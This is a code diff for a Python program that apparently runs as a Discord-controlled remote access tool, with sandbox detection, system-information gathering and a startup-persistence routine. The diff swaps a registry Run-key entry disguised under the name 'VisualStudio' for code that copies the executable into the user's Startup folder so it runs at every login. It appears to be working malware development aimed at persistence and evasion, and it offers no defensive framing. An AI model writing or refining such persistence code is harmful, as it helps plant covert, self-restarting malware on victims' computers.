@@ -11,8 +11,8 @@ import psutil
 import getpass
 import os
 import sys
-import winreg
 import requests
+import winreg
 
 intents = Intents.default()
 intents.guilds = True
@@ -102,23 +102,26 @@ def is_windows_sandbox():
 
 def add_to_startup():
     try:
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_SET_VALUE
-        )
-        winreg.SetValueEx(
-            key,
-            "VisualStudio",
-            0,
-            winreg.REG_SZ,
-            sys.executable
-        )
-        winreg.CloseKey(key)
-        print("Added to startup successfully.")
+        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        if not os.path.exists(startup_dir):
+            os.makedirs(startup_dir)
+
+        if getattr(sys, 'frozen', False):
+            exe_path = sys.executable
+        else:
+            exe_path = os.path.abspath(__file__)
+
+        exe_name = os.path.basename(exe_path)
+        destination_path = os.path.join(startup_dir, exe_name)
+
+        if not os.path.exists(destination_path):
+            import shutil
+            shutil.copy(exe_path, destination_path)
+            print(f"Added to Startup directory: {destination_path}")
+        else:
+            print("Executable/script already exists in Startup directory.")
     except Exception as e:
-        print(f"Error adding to startup: {e}")
+        print(f"Error adding to Startup directory: {e}")
 
 def get_system_info():
     system_info = {
